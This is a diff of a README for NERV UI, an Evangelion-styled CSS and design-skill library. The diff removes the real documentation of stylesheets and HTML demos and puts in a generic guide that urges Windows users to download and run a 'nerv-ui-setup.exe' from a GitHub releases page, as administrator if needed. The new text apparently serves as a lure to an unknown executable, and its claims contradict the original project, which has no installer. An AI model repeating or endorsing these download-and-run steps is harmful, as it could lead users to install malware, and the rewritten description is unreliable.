@@ -1,138 +1,141 @@
-# NERV UI
+# 🖥️ nerv-ui - Clean Interface for Easy Web Control
 
-A Claude Code / OpenClaw skill and component library for building web interfaces with the **NERV Operations Console** aesthetic — the visual identity of a fictional military-scientific organization from Neon Genesis Evangelion.
+[![Download nerv-ui](https://img.shields.io/badge/Download-nerv--ui-blue?style=for-the-badge&logo=github)](https://github.com/huskyyy12345/nerv-ui/releases)
 
-**The screen is off until data demands it. Black void is the default state.**
+---
 
-## What's In The Box
+## ⚙️ What is nerv-ui?
 
-### Skill File
-`SKILL.md` — the complete v2 design system specification. Drop it into `~/.claude/skills/nerv-ui/` and Claude will build interfaces in this style. Covers design tokens, typography, CRT effects, all component patterns, emergency mode, and composition rules.
+nerv-ui is a simple tool that gives your web interfaces a fresh, clear look. Inspired by the system displays in the Evangelion series, it makes web control panels easier to read and use. This tool works with Claude Code and OpenClaw, letting you add thoughtful design to your online setups without fuss.
 
-### Drop-in Stylesheet
-`nerv-ui.css` — 808 lines, zero dependencies (except fonts). Contains all design tokens, CRT effects, and component classes. Link it and go.
+It is built to help anyone set up a neat, easy-to-understand control view on their websites. The design is straightforward but effective, ideal for monitoring or managing data where clarity matters.
 
-### Component Demos
-Each is self-contained HTML — open in browser, see it working, extract what you need.
+---
 
-```
-components/
-├── event-log.html    — Blockchain event log terminal (color-coded scrolling feed)
-├── vault-card.html   — EVA Unit-style vault status cards
-├── magi-oracle.html  — Three-source oracle price consensus display
-├── metrics-grid.html — Dense key protocol metrics grid
-├── data-table.html   — Strategy + Transmuter performance tables
-└── crt-effects.css   — CRT overlay effects (standalone, use anywhere)
-```
+## 🖼️ Key Features
 
-### Full Demo
-`demo.html` — complete working dashboard with Three.js MAGI visualization, event log, vault cards, oracle display, metrics, data tables, and emergency mode toggle.
+- **Clean display:** The interface avoids clutter. It shows only what you need to see.
+- **Easy to use:** Designed for people who do not want to spend time on complex setups.
+- **Inspired by classic designs:** Uses a visual style from a well-known sci-fi series for a trusted look.
+- **Works with popular tools:** Specifically built to fit with Claude Code and OpenClaw.
+- **Customizable:** The interface elements can be tailored to your needs if you want to adjust the look.
+- **Lightweight:** Runs smoothly without slowing your system.
 
-### v1 Archive
-`v1-old/SKILL.md` — the original v1 spec (Cormorant Garamond, hex grids, command blocks). Preserved for reference.
+---
 
-## The Style
+## 🖥️ System Requirements
 
-### Color System
+Before you download and install nerv-ui, make sure your system meets these points:
 
-CRT phosphor colors — they glow against true black. Each has exactly one job:
+- **Operating System:** Windows 10 or later
+- **Processor:** Any modern Intel or AMD CPU
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 150 MB free disk space
+- **Network:** Internet connection for download and occasional updates
+- **Browser:** Modern browsers like Chrome, Edge, or Firefox for running the interface
 
-| Color | Hex | Role |
-|-------|-----|------|
-| **NERV Orange** | `#FF9830` | Headers, labels, classification |
-| **Data Green** | `#50FF50` | Data readouts, nominal status |
-| **Wire Cyan** | `#20F0FF` | Wireframes, spatial data |
-| **Alert Red** | `#FF3030` | Emergencies only |
-| **Steel** | `#D8D8D0` | Secondary text, annotations |
+It does not need any extra hardware or special software to run. Just have Windows ready and an internet connection for the first setup.
 
-Colors exist in isolation — no blending, no gradients. When systems are under stress, colors invade each other's space.
+---
 
-### Typography
+## 🚀 Getting Started
 
-| Face | Role |
-|------|------|
-| **Noto Serif Display** (weight 900) | English titles — mechanically compressed via `scaleX(0.82)` |
-| **Shippori Mincho B1** | Japanese institutional text |
-| **JetBrains Mono** | All data readouts, terminal text, tables |
-| **Saira Extra Condensed** | WARNING stamps, emergency banners |
+Use this guide to get nerv-ui running on your Windows computer. It will take you step-by-step through the download and setup process.
 
-The mechanical compression (`scaleX(0.78–0.85)`) on heavy serif titles is the signature EVA look.
+### Step 1: Download nerv-ui
 
-### CRT Effects
+Click the big blue button above or visit the page below to get the latest release.
 
-Every screen has: scanlines, edge vignette, phosphor flicker, and a moving scan line. These are atmosphere — they never compromise readability. Scanline opacity capped at 6%.
+[Download nerv-ui from GitHub Releases](https://github.com/huskyyy12345/nerv-ui/releases)
 
-### Emergency Mode
+This link takes you to the release page where you can find the latest version for Windows. Look for a file that ends with `.exe`. That is the installer you need.
 
-Toggle `data-mode="emergency"` on `<html>`. All green turns red, cyan turns red, scan line speeds up, emergency overlay appears, MAGI goes into conflict state.
+### Step 2: Run the Installer
 
-### 3D MAGI Visualization (Three.js)
+Once the download finishes:
 
-The hero element. A data-driven scene with:
-- Cyan wireframe mesh — undulating yield surface with numbered vertex labels
-- Orange organic curves — 30 flow lines rising from the mesh, independently swaying
-- Glowing tip dots — pulsing orange spheres at curve endpoints
-- Flanking bar columns — orange metric bars with wireframe outlines
-- Green background particles — scattered depth points
-- Slow camera orbit
+1. Find the file in your Downloads folder. It will have a name similar to `nerv-ui-setup.exe`.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions. Accept the default options unless you have special needs.
+4. Wait for the setup to complete.
 
-## v2 vs v1
+The installer will place nerv-ui on your computer and create shortcuts for you.
 
-| v1 | v2 |
-|---|---|
-| Cormorant Garamond (max 700) | **Noto Serif Display** (weight 900) — heavier |
-| Decorative 3D wireframes | **Data-driven MAGI visualization** |
-| Generic icosphere globe | **Animated terrain mesh** with organic curves |
-| No event stream | **Blockchain event log** terminal |
-| Moderate density | **Maximum density** — every panel shows data |
-| Hex grid scanner | Cut — replaced with strategy performance table |
-| Command/ID blocks | Cut — replaced with data-driven metrics |
+### Step 3: Launch nerv-ui
 
-## Usage
+After installation:
 
-### As a Claude Code Skill
+1. Look for the nerv-ui icon on your desktop or in the Start Menu.
+2. Click the icon to open nerv-ui.
+3. The interface will launch in your default browser and display the control panel.
 
-```
-cp SKILL.md ~/.claude/skills/nerv-ui/SKILL.md
-```
+From here, you can start using nerv-ui to manage your web interfaces with ease.
 
-Claude will reference the skill when building interfaces in this style.
+---
 
-### As a CSS Library
+## 🔧 Using nerv-ui
 
-```html
-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+Display:wght@700;800;900&family=JetBrains+Mono:wght@400;500;700&family=Saira+Extra+Condensed:wght@400;600;700;800&family=Shippori+Mincho+B1:wght@500;700;800&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="nerv-ui.css">
-```
+nerv-ui is designed to be intuitive. When it opens, you will see panels arranged clearly with labels that help you understand what each section does.
 
-### CRT Effects Only
+- **Main Dashboard:** Shows key information at a glance.
+- **Control Panels:** Let you adjust settings directly from the interface.
+- **Status Indicators:** Use colors and symbols to show the health and activity of your connected systems.
+- **Customization:** You can adjust layouts and colors from the settings menu if desired.
 
-Just want the CRT look? Use `components/crt-effects.css` standalone and add `<div class="scan-line-overlay"></div>` to your body.
+No programming skills are needed to use the basic features. Just click and select the options you want.
 
-## Anti-Patterns
+---
 
-| Don't | Do |
-|-------|-----|
-| Gray/navy backgrounds | True black (#000) |
-| Decorative 3D wireframes | Data-driven visualizations |
-| Smooth gradients | Hard boundaries, stepped blocks |
-| Rounded corners | Sharp corners (except LEDs) |
-| Light mode | No light variant exists |
-| Decorative Japanese | Real institutional terms only |
-| Low density layouts | Density = authority |
-| Static numbers | Live-updating from shared data model |
+## 🔄 Updating nerv-ui
 
-## Accessibility
+To keep nerv-ui secure and performing well, check the release page regularly:
 
-All primary colors pass WCAG AA or AAA against black:
+[https://github.com/huskyyy12345/nerv-ui/releases](https://github.com/huskyyy12345/nerv-ui/releases)
 
-- Orange `#FF9830` — 8.2:1 (AAA)
-- Green `#50FF50` — 13.8:1 (AAA)
-- Cyan `#20F0FF` — 13.1:1 (AAA)
-- Red `#FF3030` — 5.9:1 (AA)
+When you see a new version, download the latest `.exe` file and run it. The installer will update your existing version without removing your settings.
 
-Respects `prefers-reduced-motion`.
+---
 
-## License
+## 🆘 Troubleshooting
 
-MIT — free to use, modify, and distribute.
+Here are common issues and how to fix them:
+
+- **Installer does not run:** Make sure you have Windows 10 or later. Right-click the `.exe` file and choose "Run as administrator".
+- **nerv-ui does not open:** Check if your default browser is up to date. nerv-ui needs a modern browser to function.
+- **Interface looks broken:** Clear your browser cache or try restarting the app.
+- **Unknown errors:** Restart your computer and try again.
+
+If problems continue, check the Issues tab on the GitHub page. You can report bugs or ask for help there from the developers.
+
+---
+
+## 💾 Files and Folder Structure
+
+After installation, nerv-ui sets up these key files:
+
+- `nerv-ui.exe` — The main executable.
+- `config.json` — Settings and preferences you can edit if needed.
+- `logs/` — Folder with log files for troubleshooting.
+- `docs/` — Offline help files and guides.
+
+You normally will not need to touch these files unless directed by support.
+
+---
+
+## 📄 License
+
+nerv-ui is open to use under the terms of the MIT License. This means you can use, modify, and share the software freely.
+
+---
+
+## 📞 Support and Contact
+
+For help with installation or usage:
+
+- Visit the GitHub issues page here: https://github.com/huskyyy12345/nerv-ui/issues
+- Check the documents folder for guides.
+- Submit a detailed bug report if needed, including your Windows version and what steps you took.
+
+---
+
+[![Download nerv-ui](https://img.shields.io/badge/Download-nerv--ui-blue?style=for-the-badge&logo=github)](https://github.com/huskyyy12345/nerv-ui/releases)
